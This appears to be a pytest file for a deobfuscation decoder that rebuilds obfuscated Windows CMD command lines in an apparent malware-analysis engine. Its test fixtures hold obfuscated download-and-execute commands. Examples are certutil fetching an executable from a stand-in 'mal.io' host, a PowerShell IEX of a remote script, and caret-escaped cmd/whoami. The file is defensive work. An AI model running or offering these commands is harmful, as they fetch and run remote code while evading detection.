"""RC2.7 · CMD reconstruction decoder.

Locks the new `cmd-reconstruct` plugin capabilities:

  • `%VAR%` expansion after `SET VAR=value`
  • `!VAR!` delayed expansion (cmd /V:ON)
  • Caret escape stripping (`c^m^d.exe` → `cmd.exe`)
  • CALL-of-variable reveal (analogous to ps-reconstruct invoke-var)
  • Precision guards (no expansion when no SET, no false-positive IOCs)
"""
from __future__ import annotations

import pytest

from engine import AnalysisContext as _Ctx, Budget as _Bud, Orchestrator
import decoders  # noqa: F401 — triggers plugin registration
from decoders.cmd_reconstruct import CmdReconstructDecoder
from engine.models import Fingerprint


def _fp(payload: str) -> Fingerprint:
    return Fingerprint(
        input_len=len(payload),
        printable_ratio=1.0,
        english_density=0.5,
        entropy=4.0,
        is_binary=False,
    )


@pytest.fixture()
def decoder():
    return CmdReconstructDecoder()


@pytest.fixture()
def ctx():
    return _Ctx(budget=_Bud(wall_time_ms=4000))


def _trace_text(report) -> str:
    hay = (report.output or "")
    for step in report.trace:
        hay += "\n" + (step.preview or "")
    return hay


# ---------------------------------------------------------------- #
#  Delayed expansion — the flagship P0.3 sample
# ---------------------------------------------------------------- #
def test_delayed_expansion_reconstructs_certutil():
    payload = 'cmd.exe /V:ON /c "set A=cert&& set B=util&& !A!!B!.exe -urlcache -f http://mal.io/x.exe drop.exe"'
    report = Orchestrator(_Ctx(budget=_Bud(wall_time_ms=4000))).run(payload)
    hay = _trace_text(report)
    assert "certutil" in hay
    assert "http://mal.io/x.exe" in hay
    assert "cmd-reconstruct" in [s.decoder for s in report.trace]


def test_delayed_expansion_direct_call(decoder, ctx):
    payload = "set A=power&& set B=shell&& !A!!B!"
    result = decoder.decode(payload, {}, ctx)
    assert "powershell" in result.output


# ---------------------------------------------------------------- #
#  Percent-var expansion
# ---------------------------------------------------------------- #
def test_percent_var_set_and_call(decoder, ctx):
    payload = "set U=powershell&& set X=IEX && %U% %X% (iwr http://x.io/y.ps1)"
    result = decoder.decode(payload, {}, ctx)
    assert "powershell" in result.output
    assert "IEX" in result.output


def test_percent_var_nested_cascades(decoder, ctx):
    """`%A%%B%` should resolve when both A and B are set."""
    payload = "set A=cert&& set B=util&& %A%%B%.exe"
    result = decoder.decode(payload, {}, ctx)
    assert "certutil.exe" in result.output


def test_percent_var_unresolved_stays_literal(decoder, ctx):
    """`%TEMP%` (no matching SET) is a real env var — leave it alone."""
    payload = "certutil.exe -urlcache -f http://x %TEMP%\\y.exe"
    result = decoder.decode(payload, {}, ctx)
    # No SET → no expansion → payload returns unchanged
    assert "%TEMP%" in result.output


# ---------------------------------------------------------------- #
#  Caret escape stripping
# ---------------------------------------------------------------- #
def test_caret_escape_collapses(decoder, ctx):
    payload = "c^m^d.exe /c wh^oami"
    result = decoder.decode(payload, {}, ctx)
    assert "cmd.exe" in result.output
    assert "whoami" in result.output


def test_caret_at_eol_preserved(decoder, ctx):
    """`^` at end-of-line is line-continuation in real CMD — must NOT be
    stripped (would change semantics)."""
    payload = "set A=cert^\nset B=util"
    result = decoder.decode(payload, {}, ctx)
    # The eol caret was preserved (still followed by newline, not printable)
    assert "^\n" in result.output


# ---------------------------------------------------------------- #
#  CALL-of-variable reveal
# ---------------------------------------------------------------- #
def test_call_var_reveal(decoder, ctx):
    payload = "set BIN=certutil.exe&& CALL %BIN% -urlcache -f http://x/y.exe"
    result = decoder.decode(payload, {}, ctx)
    # certutil.exe appears both via CALL reveal + via %BIN% expansion
    assert "certutil.exe" in result.output


# ---------------------------------------------------------------- #
#  Detection precision guards
# ---------------------------------------------------------------- #
def test_detect_no_signal_returns_zero(decoder, ctx):
    payload = "just some benign text with no CMD syntax"
    r = decoder.detect(payload, _fp(payload), ctx)
    assert r.confidence == 0.0


def test_detect_env_var_only_no_set_stays_low(decoder, ctx):
    """Real env vars like `%TEMP%` without a SET must not trigger detection."""
    payload = "notepad.exe %TEMP%\\file.txt"
    r = decoder.detect(payload, _fp(payload), ctx)
    assert r.confidence == 0.0


def test_detect_combo_beats_extract_wrapper(decoder, ctx):
    """SET + !VAR! + URL combo must hit ≥ 0.85 to beat extract-wrapper (0.65)."""
    payload = 'cmd /V:ON /c "set A=cert&& set B=util&& !A!!B!.exe -f http://x/y.exe"'
    r = decoder.detect(payload, _fp(payload), ctx)
    assert r.confidence >= 0.85


def test_no_false_positive_iocs():
    """The reconstruction pass must NOT invent new IOCs — the RC2.3 gate."""
    payload = 'cmd.exe /V:ON /c "set A=cert&& set B=util&& !A!!B!.exe -urlcache -f http://mal.io/x.exe drop.exe"'
    report = Orchestrator(_Ctx(budget=_Bud(wall_time_ms=4000))).run(payload)
    urls = list(report.findings.iocs.urls)
    # Only the payload URL should surface — no invented / normalised extras
    assert len(urls) == 1
    assert urls[0] == "http://mal.io/x.exe"
